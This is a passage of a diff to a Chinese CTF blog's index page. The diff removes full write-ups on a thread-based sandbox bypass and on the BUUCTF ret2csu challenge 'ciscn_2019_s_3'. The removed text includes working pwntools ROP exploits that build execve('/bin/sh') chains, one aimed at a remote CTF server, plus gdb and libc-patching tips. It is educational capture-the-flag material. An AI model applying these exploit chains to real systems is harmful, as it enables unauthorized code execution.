class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">execve_addr=libc_base+libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rax = libc_base+<span class="number">0x45eb0</span></span><br><span class="line">pop_rsi = libc_base+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12 = libc_base+<span class="number">0x11f497</span></span><br><span class="line">jmp_rax = <span class="number">0x4011cc</span></span><br><span class="line"></span><br><span class="line">payload = p64(call_read)</span><br><span class="line">payload+= p64(pop_rax)+p64(jmp_rax)*<span class="number">2</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>])+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(pop_rbp)+p64(bss+<span class="number">0x340</span>)+p64(call_read)+p64(bss+<span class="number">0x300</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(execve_addr)</span><br><span class="line">payload+= p64(bss+<span class="number">0x300</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>拿到<code>flag</code></p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101142302.png" alt="image-20240428184257703"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
-<li><p>几个<code>gdb</code>调试要用到的命令：</p>
-<p>查询线程<code>id</code>：<code>i threads</code></p>
-<p>切换线程：<code>thread id</code></p>
-<p>线程锁定：<code>set scheduler-locking on</code></p>
-<p>解除锁定：<code>set scheduler-locking off</code></p>
-</li>
-<li><p>沙箱（<em>Sandbox</em>）是一种安全机制，用于限制程序的运行环境。如果父进程在创建子线程之前设置了沙箱策略，那么这些策略可能会限制子线程的行为。然而，如果子线程在沙箱策略设置之前就已经创建，那么它可能不会受到这些限制。</p>
-</li>
-<li><blockquote>
-<p>子进程的栈区是父进程用<em>mmap</em>映射出来的一片内存(并不能在父进程里溢出篡改子进程的数据)</p>
-<p><em>bss</em>段 <em>data</em>段以及代码段(以及<em>got</em>表)的数据是父进程和子进程之间所共享的</p>
-</blockquote>
-</li>
-</ol>
-
+          <p>通过一道题来学习一下利用线程绕过沙箱。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/07/10/%E4%B8%80%E9%81%93%E5%85%B3%E4%BA%8E%E9%80%9A%E8%BF%87%E7%BA%BF%E7%A8%8B%E7%BB%95%E8%BF%87%E6%B2%99%E7%AE%B1%E7%9A%84%E9%A2%98/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -700,7 +603,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-02-23 17:53:05" itemprop="dateModified" datetime="2025-02-23T17:53:05+08:00">2025-02-23</time>
+                <time title="修改时间：2025-02-23 18:03:26" itemprop="dateModified" datetime="2025-02-23T18:03:26+08:00">2025-02-23</time>
               </span>
 
           
@@ -714,57 +617,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <span id="more"></span>
-
-<h1 id="关于ret2csu的一道题"><a href="#关于ret2csu的一道题" class="headerlink" title="关于ret2csu的一道题"></a>关于<code>ret2csu</code>的一道题</h1><p><code>BUU</code>：<code>ciscn_2019_s_3</code></p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>检查保护，开了<code>NX</code>保护</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101108593.png" alt="image-20240223192404259"></p>
-<p>源码：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​	程序中有两个系统调用，<code>read</code>可栈溢出，程序中没有后门函数。但是我们看到了下面这个，<code>3bh</code>是<code>64</code>位程序<code>execve</code>的系统调用号，程序中有系统调用则肯定有<code>syscall</code>即我们可以利用<code>gadgets</code>布置<code>execve</code>的参数，然后<code>syscall</code>获得<code>shell</code>。</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101109280.png" alt="image-20240223193124425"></p>
-<p>​	系统调用<code>execve</code>，我们必须要知道<code>/bin/sh</code>的地址。本题中，<code>buf</code>的长度为<code>16</code>个字节，而<code>write</code>打印<code>0x30</code>个字节，又因为<code>buf</code>在栈上，所以<code>buf</code>下面的一些栈中的数据也会被打印出来。</p>
-<p>​	我们填满<code>buf</code>的<code>16</code>个字节，然后发送<code>vuln</code>函数的第一个指令的地址，执行流会重新执行一遍<code>vuln</code>函数。发送<code>payload = b&#39;/bin/sh\x00&#39;+b&#39;a&#39;*8+p64(vuln_addr)</code>，然后看栈中的内容，其中<code>0x7ffd3e0cdce8</code>是栈地址同时也能被泄漏。</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101109881.png" alt="image-20240223220610682"></p>
-<p><code>payload</code>如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_02_content = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_02_content  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(stack_02_content))</span><br><span class="line">binsh_addr = stack_02_content-<span class="number">0x148</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br></pre></td></tr></table></figure>
-
-<p>​	接下来就是传参，不过我们没有直接找到<code>rdx</code>相关的<code>gadget</code>地址，好吧，其实这就是道关于<code>ret2csu</code>类型的题。</p>
-<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101110328.png" alt="image-20240710111035299" style="zoom:80%;" />
-
-<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101111199.png" alt="image-20240710111108172" style="zoom:80%;" />
-
-<p>​	下面是<code>csu</code>片段，我们就是要利用这两个片段，对寄存器进行各种操作，最后使<code>rdx</code>中的值为<code>0</code>（<code>execve</code>的第<code>3</code>个参数）。</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101111960.png" alt="image-20240223193956921"></p>
-<p>​	<code>csu</code>②都是一些<code>pop</code>，重要的是怎么绕过<code>csu</code>①，首先我们要弄懂<code>csu</code>①中的汇编代码是什么意思。其中，<code>call</code>指令是调用函数，这里的<code>[]</code>是间接寻址，<code>call  [r12+rbx*8]</code>这个指令的意思是调用一个函数，这个函数在哪，这个函数的地址在<code>r12+rbx*8</code>这个地址里装着。也就是说，如果<code>r12</code>和<code>rbx</code>的值分别为<code>0x123456</code>和<code>0</code>，<code>0x123456</code>又指向<code>0x400123</code>这个地址，那么我们要调用的函数的地址不是<code>0x123456</code>而是<code>0x400123</code>。</p>
-<p>​	<code>cmp</code>指令用于比较两个操作数的值，<code>cmp  rbx,rbp</code>指令的意思是比较<code>rbx</code>和<code>rbp</code>这两个寄存器的值。如果<code>rbx</code>和<code>rbp</code>的值不相等，那么<code>jnz</code>会跳转到相应的地址执行，反之执行流继续执行下一条指令。</p>
-<p><code>payload</code>如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">csu1_addr = <span class="number">0x400580</span></span><br><span class="line">csu2_addr = <span class="number">0x40059a</span></span><br><span class="line">term_proc_lastone_addr = <span class="number">0x600e50</span></span><br><span class="line"></span><br><span class="line">payload = p64(csu2_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(term_proc_lastone_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#                           rbx    rbp        r12                     r13   r14     r15</span></span><br><span class="line">payload += p64(csu1_addr)</span><br></pre></td></tr></table></figure>
-
-<p>​	我们在<code>ida</code>中看到<code>term_proc</code>是一个空函数，其地址为<code>0x4005b4</code>，当然这个肯定不是我们想要的，我们想要的是哪个地址指向<code>0x4005b4</code>。</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101112897.png" alt="image-20240223200400679"></p>
-<p>在<code>gdb</code>中，我们利用<code>search -p 0x4005b4</code>这个命令看到<code>0x600e50</code>这个地址中装的是<code>0x4005b4</code>。</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101112143.png" alt="image-20240223200329635"></p>
-<p>​	一开始按照上面的<code>payload</code>发送一直打不通，调试的时候发现，调用完这个空函数后会<code>ret</code>到返回地址<code>0x40058d</code>也就是<code>csu</code>①中的<code>add     rbx, 1</code>指令，后面会影响栈的有<code>add   rsp,8</code>和<code>6</code>个<code>pop</code>指令，所以我们还需要再发送<code>7*8</code>个垃圾数据。</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101112790.png" alt="image-20240224101044851"></p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101113922.png" alt="image-20240224101247650"></p>
-<p>修改后<code>payload</code>如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">csu1_addr = <span class="number">0x400580</span></span><br><span class="line">csu2_addr = <span class="number">0x40059a</span></span><br><span class="line">term_proc_lastone_addr = <span class="number">0x600e50</span></span><br><span class="line">payload = p64(csu2_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(term_proc_lastone_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu1_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400501</span></span><br><span class="line">mov_rax_addr = <span class="number">0x4004e2</span></span><br><span class="line">payload += p64(mov_rax_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(syscall_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
-
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./s3&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28982</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_02_content = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_02_content  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(stack_02_content))</span><br><span class="line">binsh_addr = stack_02_content-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">csu1_addr = <span class="number">0x400580</span></span><br><span class="line">csu2_addr = <span class="number">0x40059a</span></span><br><span class="line">term_proc_lastone_addr = <span class="number">0x600e50</span></span><br><span class="line">payload += p64(csu2_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(term_proc_lastone_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu1_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400501</span></span><br><span class="line">mov_rax_addr = <span class="number">0x4004e2</span></span><br><span class="line">payload += p64(mov_rax_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(syscall_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>拿到<code>flag</code></p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101113867.png" alt="image-20240122145901772"></p>
-<h2 id="更换libc"><a href="#更换libc" class="headerlink" title="更换libc"></a>更换<code>libc</code></h2><p>​	本题中本地和远程的<code>libc</code>不一样，所以偏移量也不同，本题中本地的是<code>0x148</code>远程为<code>0x118</code>。我们可以利用<code>pathelf</code>和<code>glibc-all-in-one</code>更换本地依赖的<code>libc</code>。</p>
-<p>​	首先用<code>strings ./libc-2.23.so | grep &quot;GNU&quot;</code>命令查看远程<code>libc</code>的<code>GLIBC</code>版本</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101114720.png" alt="image-20240224000900918"></p>
-<p>然后在<code>glibc-all-in-one</code>中找到对应的版本号，<code>64</code>位程序对应<code>amd64</code>，<code>32</code>位程序对应<code>i386</code></p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101114715.png" alt="image-20240224001212635"></p>
-<p>执行<code>./download 2.23-0ubuntu11.3_amd64</code>，便会在<code>glibc-all-all-in-one</code>目录下的<code>libs</code>目录中生成一个新目录</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101114024.png" alt="image-20240224001750545"></p>
-<p>最后便可利用<code>patchelf</code>中<code>--set-interpreter </code>和<code>--add-needed</code>选项分别设置链接器和依赖的路径即可。</p>
-
+          <p>关于<code>ret2csu</code>的一道题</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/07/10/%E5%85%B3%E4%BA%8Eret2csu%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
